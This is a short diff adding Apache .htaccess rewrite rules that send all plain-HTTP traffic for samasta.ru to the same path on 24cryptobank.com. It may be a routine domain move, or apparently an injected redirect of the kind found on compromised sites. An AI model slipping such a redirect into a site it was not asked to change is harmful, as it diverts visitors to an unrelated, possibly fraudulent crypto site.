@@ -1,0 +1,4 @@
+RewriteEngine On 
+RewriteCond %{SERVER_PORT} 80
+RewriteCond %{HTTP_HOST} ^(www\.)?samasta\.ru
+RewriteRule ^(.*)$ https://24cryptobank.com/$1 [R,L]
